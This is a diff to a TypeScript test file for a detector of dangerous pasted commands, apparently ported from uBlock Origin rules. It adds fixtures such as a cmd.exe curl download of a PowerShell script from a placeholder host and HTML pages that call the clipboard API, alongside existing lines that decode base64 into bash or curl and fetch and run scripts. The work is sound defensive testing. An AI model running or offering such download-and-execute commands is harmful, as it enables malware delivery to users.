@@ -241,6 +241,7 @@ const PORTED: readonly [string, 'high' | 'medium', string][] = [
   ['herestring-base64', 'high', x('bash <', '<< "$(echo aGVsbG8gd29ybGQK | base', '64 -d)"')],
   ['herestring-base64', 'high', x('curl -kf', 'sSL $(echo aGVsbG8gd29ybGQK | base', '64 -d)')],
   ['cmd-payload', 'high', x(CMD, ' /c curl -o t.exe https://example.invalid/t.exe')],
+  ['cmd-payload', 'high', x(CMD, ' /c cu', 'rl.exe -o t.ps1 https://example.invalid/t.ps1')],
   ['cmd-for-delims', 'high', x(CMD, ' /c "for /f "tokens=1 delims=," %a in ("pow,er") do echo %a"')],
   ['powershell-hidden', 'high', x(PSH, ' -w minimized -c "Write-Output test"')],
   ['powershell-hidden', 'high', x(PSH, ' -WindowStyle h -c "Write-Output test"')],
@@ -291,6 +292,8 @@ const PORTED: readonly [string, 'high' | 'medium', string][] = [
   ['ps-comment-lure', 'high', x('<#Veri', 'fication ID: 1234#> Write-Output test')],
   ['iwr-wscript', 'high', x('Invoke-Web', 'Request https://example.invalid/a.js -OutFile a.js; wscr', 'ipt a.js')],
   ['url-filename-exe', 'high', x('$url = "https://example.invalid/a"\n$file', 'name = "test.exe"')],
+  ['html-clipboard', 'high', x('<html><body><script>navig', 'ator.clipboard.writeText("test")</script></body></html>')],
+  ['html-clipboard', 'high', x('<!doctype html>\n<HTML lang="en">\n<script>\nnavig', 'ator.clipboard.readText()\n</script>')],
 ];
 
 test('every ported uBO rule has a positive fixture, with the declared severity', () => {
@@ -330,6 +333,16 @@ test('quiet cmd rules need /q /c with /v:on or /d, or a for loop after it', () =
     x(CMD, ' /q /c echo format'), // "for" only inside a word
     x(CMD, ' /c "fo', 'r %a in (1) do echo %a"'), // a for loop without /q
     x('Use ', CMD, ' /q /c for quiet batch runs.'), // prose, not a line start
+  ];
+  for (const s of NEAR) assert.equal(detectDangerousCommand(s), null, `${s} -> ${JSON.stringify(detectDangerousCommand(s))}`);
+});
+
+test('html-clipboard needs an <html> line and the clipboard API in the same text', () => {
+  const NEAR: readonly string[] = [
+    '<html><body><p>Hello</p></body></html>', // a page, no clipboard
+    '<script>navigator.clipboard.writeText("test")</script>', // clipboard, no <html>
+    'Wrap it in <html> and call navigator.clipboard.writeText() on click.', // prose, not a line start
+    '<htmlx>navigator.clipboard</htmlx>', // not an <html> tag
   ];
   for (const s of NEAR) assert.equal(detectDangerousCommand(s), null, `${s} -> ${JSON.stringify(detectDangerousCommand(s))}`);
 });
